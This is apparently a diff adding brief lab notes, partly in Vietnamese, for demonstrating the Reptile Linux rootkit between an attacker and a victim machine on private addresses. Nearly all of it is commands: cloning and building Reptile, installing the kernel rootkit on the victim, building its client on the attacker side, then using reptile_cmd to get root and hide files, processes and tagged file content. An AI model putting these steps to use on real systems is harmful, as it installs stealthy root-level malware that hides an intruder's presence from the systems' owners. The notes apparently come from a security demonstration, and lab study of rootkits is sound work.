@@ -1,0 +1,43 @@
+Demo RootKit Reptile
+
+IP
+Attack: 192.168.174.192
+Victim: 192.168.174.193
+
+
+2) Cài đặt Rootkit
+
+
+Victim:
+sudo apt-get install build-essential
+apt install build-essential libncurses-dev linux-headers-$(uname -r)
+git clone https://github.com/f0rb1dd3n/Reptile.git
+cd Reptile
+make config  
+make 
+sudo make install
+
+Attacks:
+sudo apt-get install build-essential
+apt install build-essential libncurses-dev linux-headers-$(uname -r)
+git clone https://github.com/f0rb1dd3n/Reptile.git
+cd Reptile
+make menuconfig           #(save same configuration as victim)
+apt install libreadline-dev
+make client
+cd output/
+./client
+
+
+
+3) Thực hiện các chức năng
+Lấy quyền root: /reptile/reptile_cmd root
+Ẩn tệp tin, quy trìnhh:  
+       Để ẩn: /reptile/reptile_cmd hide
+       Để bỏ ẩn:/reptile/reptile_cmd show
+Ẩn nội dung bị ẩn: 
+#<reptile> 
+ 
+#</reptile>
+
+
